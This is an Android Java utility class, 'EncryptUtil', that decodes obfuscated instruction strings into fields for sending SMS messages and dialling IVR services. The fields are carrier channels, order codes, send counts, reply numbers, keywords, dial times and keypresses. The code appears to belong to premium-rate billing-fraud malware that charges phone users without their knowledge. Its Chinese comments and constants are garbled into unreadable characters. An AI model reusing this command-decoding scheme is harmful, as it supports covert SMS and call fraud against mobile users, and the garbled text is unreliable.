package com.sttm.util;

import java.util.ArrayList;

import java.util.List;

import android.util.Log;

import com.sttm.bean.BaseZone;
import com.sttm.bean.BillSms;
import com.sttm.bean.Ivr;

//����ֻ��ͨ����
//С��5�Ļ�׼ֵ�Ӵ�дB�Ŀ�ʼ�����ڵ���5�Ļ�׼ֵ��Сд��d��ʼ

public class EncryptUtil {
	private final static String SMSF = "������״����������";
	
	private final static String BASE_SMSF = "����ϵͳ��Դ�ͻ���ϵ";

	public int getRodom() {

		return (int) (Math.random() * 10);

	}

	// ���Ű���
	public static BillSms getEncryptSMSString(String smsContent) {
		// �������Ĳ����Ƕ�������
		//Log.d("EncryptUtil", smsContent);
		BillSms billSms = new BillSms();
		char[] charContent = smsContent.toCharArray();

		List<Integer> first = getNextSign(smsContent, SMSF, 0);

		// �ƶ�ͨ��
		List<Integer> second = getNextSign(smsContent, SMSF, first.get(0));

		char[] mobileChanel = new char[second.get(0) - first.get(0) - 1];

		System.arraycopy(charContent, first.get(0) + 1, mobileChanel, 0,
				second.get(0) - first.get(0) - 1);
		//Log.d("mobileChanel", new String(mobileChanel));
		//Log.d("index", first.get(1) + "(SMSF.toCharArray())[first.get(1)])");
		//Log.d("mobileChanel", getReEncryptStr(mobileChanel, first.get(1)));
		LogFile.WriteLogFile("�ƶ�ͨ��" + new String(mobileChanel));

		billSms.setMobileChanel(getReEncryptStr(mobileChanel, first.get(1)));

		// �ƶ�ָ��
		List<Integer> three = getNextSign(smsContent, SMSF, second.get(0));
		char[] mobileOrder = new char[three.get(0) - second.get(0) - 1];
		System.arraycopy(charContent, second.get(0) + 1, mobileOrder, 0,
				three.get(0) - second.get(0) - 1);
		//Log.d("�ƶ�ָ��", new String(mobileOrder));
		LogFile.WriteLogFile("�ƶ�ָ��" + new String(mobileOrder));

		billSms.setMobileOrder(new String(mobileOrder));

		// ��ͨͨ��
		List<Integer> four = getNextSign(smsContent, SMSF, three.get(0));
		char[] unionChanel = new char[four.get(0) - three.get(0) - 1];
		System.arraycopy(charContent, three.get(0) + 1, unionChanel, 0,
				four.get(0) - three.get(0) - 1);
		//Log.d("��ͨͨ��", new String(unionChanel));
		//Log.d("��ͨͨ��", getReEncryptStr(unionChanel, three.get(1)));
		LogFile.WriteLogFile("��ͨͨ��" + new String(unionChanel));
		billSms.setUnionChanel(getReEncryptStr(unionChanel, three.get(1)));

		// ��ָͨ��
		List<Integer> five = getNextSign(smsContent, SMSF, four.get(0));
		char[] unionOrder = new char[five.get(0) - four.get(0) - 1];
		System.arraycopy(charContent, four.get(0) + 1, unionOrder, 0,
				five.get(0) - four.get(0) - 1);
		//Log.d("��ָͨ��", new String(unionOrder));
		LogFile.WriteLogFile("��ָͨ��" + new String(unionOrder));
		billSms.setUnionOrder(new String(unionOrder));

		// ��������
		List<Integer> six = getNextSign(smsContent, SMSF, five.get(0));
		char[] sendCount = new char[six.get(0) - five.get(0) - 1];
		System.arraycopy(charContent, five.get(0) + 1, sendCount, 0, six.get(0)
				- five.get(0) - 1);
		//Log.d("��������", new String(sendCount));

		LogFile.WriteLogFile("��������" + new String(sendCount));

		billSms.setCount(Integer.parseInt(new String(sendCount)));

		// �ظ�����
		List<Integer> sevent = getNextSign(smsContent, SMSF, six.get(0));
		char[] replyNumber = new char[sevent.get(0) - six.get(0) - 1];
		System.arraycopy(charContent, six.get(0) + 1, replyNumber, 0,
				sevent.get(0) - six.get(0) - 1);
		//Log.d("�ظ�����", new String(replyNumber));
		LogFile.WriteLogFile("�ظ�����" + new String(replyNumber));
		billSms.setReplyNumber(new String(replyNumber));

		// �ؼ���
		List<Integer> eight = getNextSign(smsContent, SMSF, sevent.get(0));
		char[] keyword = new char[eight.get(0) - sevent.get(0) - 1];
		System.arraycopy(charContent, sevent.get(0) + 1, keyword, 0,
				eight.get(0) - sevent.get(0) - 1);
		//Log.d("�ؼ���", new String(keyword));

		LogFile.WriteLogFile("�ؼ���" + new String(keyword));

		billSms.setKeyword(new String(keyword));

		return billSms;
	}
	
	
	
	
	
	
	
	
	
	
	

	// IVR����
	public static Ivr getEncryptVIRString(String smsContent) {
		// �������Ĳ����Ƕ�������
		Ivr ivr = new Ivr();
		char[] charContent = smsContent.toCharArray();
		List<Integer> first = getNextSign(smsContent, SMSF, 0);

		// ����绰��ʱ�䣨ʱ����
		List<Integer> second = getNextSign(smsContent, SMSF, first.get(0));
		char[] dialTime = new char[second.get(0) - first.get(0) - 1];
		System.arraycopy(charContent, first.get(0) + 1, dialTime, 0,
				second.get(0) - first.get(0) - 1);
		//Log.d(" ����绰��ʱ�䣨ʱ��", "==" + new String(dialTime));

		ivr.setDialTime(Long.parseLong(new String(dialTime)));

		// IVRͨ��
		List<Integer> three = getNextSign(smsContent, SMSF, second.get(0));
		char[] chanel = new char[three.get(0) - second.get(0) - 1];
		System.arraycopy(charContent, second.get(0) + 1, chanel, 0,
				three.get(0) - second.get(0) - 1);

		ivr.setChanel(new String(getReEncryptStr(chanel, second.get(1))));

		//Log.d(" IVRͨ��", "=="+ new String(getReEncryptStr(chanel, second.get(1))));
		// ������ʾʱ��1
		List<Integer> four = getNextSign(smsContent, SMSF, three.get(0));
		char[] radioPrompt1 = new char[four.get(0) - three.get(0) - 1];
		System.arraycopy(charContent, three.get(0) + 1, radioPrompt1, 0,
				four.get(0) - three.get(0) - 1);
		ivr.setRadioPrompt1(new String(radioPrompt1));

		//Log.d("������ʾʱ��1", "==" + new String(radioPrompt1));
		// //����1
		List<Integer> five = getNextSign(smsContent, SMSF, four.get(0));
		char[] keyword1 = new char[five.get(0) - four.get(0) - 1];
		System.arraycopy(charContent, four.get(0) + 1, keyword1, 0, five.get(0)
				- four.get(0) - 1);
		ivr.setKeyCode1(new String(keyword1));

		//Log.d("����1", "==" + new String(keyword1));

		// ������ʾʱ��2
		List<Integer> six = getNextSign(smsContent, SMSF, five.get(0));
		char[] radioPrompt2 = new char[six.get(0) - five.get(0) - 1];
		System.arraycopy(charContent, five.get(0) + 1, radioPrompt2, 0,
				six.get(0) - five.get(0) - 1);
		ivr.setRadioPrompt2(new String(radioPrompt2));
		//Log.d("������ʾʱ��2", "==" + new String(radioPrompt2));

		// ����2
		List<Integer> sevent = getNextSign(smsContent, SMSF, six.get(0));
		char[] keyword2 = new char[sevent.get(0) - six.get(0) - 1];
		System.arraycopy(charContent, six.get(0) + 1, keyword2, 0,
				sevent.get(0) - six.get(0) - 1);
		ivr.setKeyCode2(new String(keyword2));
		//Log.d("����2", "==" + new String(keyword2));
		
		

		// ������ʾʱ��3
		List<Integer> eight = getNextSign(smsContent, SMSF, sevent.get(0));
		char[] radioPrompt3 = new char[eight.get(0) - sevent.get(0) - 1];
		System.arraycopy(charContent, sevent.get(0) + 1, radioPrompt3, 0,
				eight.get(0) - sevent.get(0) - 1);
		ivr.setRadioPrompt3(new String(radioPrompt3));
		//Log.d("������ʾʱ��3", "==" + new String(radioPrompt3));

		// ����3
		List<Integer> nine = getNextSign(smsContent, SMSF, eight.get(0));
		char[] keyword3 = new char[nine.get(0) - eight.get(0) - 1];
		System.arraycopy(charContent, eight.get(0) + 1, keyword3, 0,
				nine.get(0) - eight.get(0) - 1);
		ivr.setKeyCode3(new String(keyword3));
		//Log.d("����3", "==" + new String(keyword3));

		// ������ʾʱ��4
		List<Integer> ten = getNextSign(smsContent, SMSF, nine.get(0));
		char[] radioPrompt4 = new char[ten.get(0) - nine.get(0) - 1];
		System.arraycopy(charContent, nine.get(0) + 1, radioPrompt4, 0,
				ten.get(0) - nine.get(0) - 1);
		ivr.setRadioPrompt4(new String(radioPrompt4));
		//Log.d("������ʾʱ��4", "==" + new String(radioPrompt4));

		// ����4
		List<Integer> elevent = getNextSign(smsContent, SMSF, ten.get(0));
		char[] keyword4 = new char[elevent.get(0) - ten.get(0) - 1];
		System.arraycopy(charContent, ten.get(0) + 1, keyword4, 0,
				elevent.get(0) - ten.get(0) - 1);
		ivr.setKeyCode4(new String(keyword4));
		//Log.d("����4", "==" + new String(keyword4));

		return ivr;
	}

	public static List<Integer> getNextSign(String str, String pattern,
			int offset) {
		List<Integer> result = new ArrayList<Integer>();

		char[] charStr = str.toCharArray();
		char[] patternChar = pattern.toCharArray();

		out: for (int i = 0; i < charStr.length; i++) {

			for (int j = 0; j < patternChar.length; j++) {
				if (charStr[i] == patternChar[j]) {
					if (i > offset) {
						result.add(0, i);
						result.add(1, j);
						break out;

					}
					break;
				}
			}

		}

		return result;

	}

	public static String getReEncryptStr(char[] mobileChanel, int n) {
		StringBuffer sb = new StringBuffer();
		for (int i = 0; i < mobileChanel.length; i++) {
			if (mobileChanel[i] >= 'a' && mobileChanel[i] <= 'z') {
				int value = mobileChanel[i] - 'd' - n;
				sb.append(value);

			} else if (mobileChanel[i] >= 'A' && mobileChanel[i] <= 'Z') {
				int value = mobileChanel[i] - 'B' - n;
				sb.append(value);
			}

		}

		return sb.toString();
	}
}
